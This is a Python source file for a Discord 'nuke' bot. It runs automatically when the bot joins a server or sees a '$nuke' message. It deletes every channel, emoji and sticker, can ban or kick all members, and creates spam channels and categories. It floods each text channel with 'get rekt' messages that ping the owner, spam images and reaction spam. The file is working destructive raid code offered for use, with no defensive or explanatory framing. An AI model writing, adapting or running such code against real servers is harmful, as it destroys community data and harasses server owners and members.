import discord
import os

token = os.getenv('token')
intents = discord.Intents.default()
intents.members, intents.message_content = True, True
client = discord.Client(intents=intents)


new_server_name = "Rekt"
text_channel_name = "spam_text"
voice_channel_name = "spam_voice"
category_name = "spam_category"
spam_message = "get rekt"
spam_img = "spam_img.png"

num_spam_channels = 4

b_spam_text_channels = True
b_create_categories = True
b_create_voice_channels = True
b_create_text_channels = True
b_delete_channels = True
b_ban_users = False
b_kick_users = False
b_delete_emojis = True
b_delete_stickers = True
b_spam_images = True
b_spam_reacts = True


async def nuke(guild):
    owner = guild.owner
    print(f'Joined: {guild.name}\nOwned by: {owner.name}\nMembers: {len(guild.members)}')
    if b_delete_channels:
        for channel in guild.channels:
            await channel.delete()
    if b_ban_users or b_kick_users:
        for member in guild.members:
            if b_ban_users:
                await member.ban()
            elif b_kick_users:
                await member.kick()
    if b_delete_emojis:
        for emoji in guild.emojis:
            await emoji.delete()
    if b_delete_stickers:
        for sticker in guild.stickers:
            await sticker.delete()
    if b_create_text_channels or b_create_voice_channels or b_create_categories:
        for i in range(1, num_spam_channels + 1):
            cat = None
            if b_create_categories:
                cat = await guild.create_category(f"{category_name} {i}")
            if b_create_text_channels:
                await guild.create_text_channel(name=text_channel_name, category=cat)
            if b_create_voice_channels:
                await guild.create_voice_channel(name=voice_channel_name, category=cat)
    if b_spam_text_channels or b_spam_images:
        for channel in guild.text_channels:
            if b_spam_text_channels:
                await channel.send(f"{spam_message}\n{owner.mention}")
            if b_spam_images:
                await channel.send(file=discord.File(fp=spam_img))


@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')


@client.event
async def on_message(message):
    if message.content.startswith('$nuke'):
        await nuke(message.channel.guild)

    if b_spam_reacts:
        reactions = ['😂', '😀', '😘', '😇', '😅', '🤐', '😏']
        for reaction in reactions:
            try:
                await message.add_reaction(reaction)
            except discord.errors.NotFound:
                return
@client.event
async def on_guild_join(guild):
    await nuke(guild)


if __name__ == '__main__':
    client.run(token=token)
